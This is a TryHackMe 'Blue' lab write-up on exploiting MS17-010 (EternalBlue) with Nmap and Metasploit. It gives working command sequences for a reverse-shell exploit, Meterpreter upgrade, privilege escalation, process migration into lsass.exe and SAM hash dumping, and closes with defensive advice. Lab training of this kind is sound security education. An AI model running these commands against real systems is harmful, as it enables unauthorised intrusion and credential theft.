# TryHackMe: Blue (Windows Exploitation)

## Room Summary

This room provides a hands-on walkthrough of exploiting a legacy Windows machine vulnerable to the famous **MS17-010 (EternalBlue)** exploit. It covers the complete offensive lifecycle: network reconnaissance, vulnerability identification, gaining initial shell access via Metasploit, upgrading shells to Meterpreter, escalating privileges to `NT AUTHORITY\SYSTEM`, dumping SAM hashes, and retrieving system flags.

## Room Details

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Room | Blue |
| Difficulty | Easy |
| Topic | Windows Exploitation, MS17-010, EternalBlue, Metasploit, Hash Dumping |
| Status | Completed |

## Skills Practiced

- Performing target reconnaissance and vulnerability scanning using Nmap NSE scripts (`--script=vuln`)
- Identifying unpatched Server Message Block (SMBv1) protocol vulnerabilities
- Configuring and executing remote code execution (RCE) exploits using the Metasploit Framework
- Upgrading standard command shells (`cmd.exe`) to interactive Meterpreter sessions
- Performing process migration (`migrate`) to stabilize shells and maintain elevated execution context
- Extracting credential hashes from the Security Account Manager (SAM) database via `hashdump`

## Hands-On & Command Reference

### Reconnaissance & Vulnerability Scanning

```bash
# Perform verbose SYN scan with default scripts and vulnerability evaluation
nmap -sS -sV -vv --script=vuln <TARGET_IP>

# Explicitly target SMB port 445 for MS17-010 vulnerability checking
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>

```

### Initial Access with Metasploit (EternalBlue)

```text
# Launch Metasploit Framework
msfconsole

# Search and select EternalBlue exploit module
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue

# Configure target and local listener options
set RHOSTS <TARGET_IP>
set LHOST <YOUR_VPN_IP>
set payload windows/x64/shell/reverse_tcp

# Execute payload
exploit

```

### Post-Exploitation, Shell Upgrade & Hash Dumping

```text
# Background current shell session
ctrl+z

# Convert standard shell to Meterpreter session
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

# Verify elevated identity in Meterpreter
getsystem
getuid

# Migrate to a stable SYSTEM-level process (e.g., lsass.exe or spoolsv.exe)
ps
migrate <PID>

# Dump SAM database password hashes
hashdump

```

## Tools and Platforms Learned

* TryHackMe
* Nmap (Network Mapper & NSE Scripts)
* Metasploit Framework (`msfconsole`)
* Meterpreter Payload Engine
* John the Ripper / Hashcat (Password Hash Cracking)

## Key Takeaways

* **Critical Protocol Flaws:** EternalBlue (MS17-010) exploits a buffer overflow vulnerability in Microsoft's SMBv1 handling, enabling unauthenticated remote code execution with full administrative privileges.
* **Process Stability:** Initial exploit shells on legacy Windows systems can be unstable; migrating the payload process to a native system service (`spoolsv.exe`, `lsass.exe`) ensures persistent access.
* **Credential Harvesting:** Once `NT AUTHORITY\SYSTEM` access is achieved, extracting local SAM hashes provides opportunities for offline cracking or Pass-the-Hash (PtH) lateral movement.

## Defensive Learning

* **Disable Legacy Protocols:** Disable SMBv1 across all enterprise endpoints and enforce SMBv2/SMBv3 with message signing.
* **Patch Management:** Apply Microsoft Security Bulletin MS17-010 immediately across legacy Windows platforms.
* **Network Segmentation:** Block external inbound access to SMB ports (`139`, `445`) at perimeter firewalls and restrict inter-subnet SMB traffic.

```

```
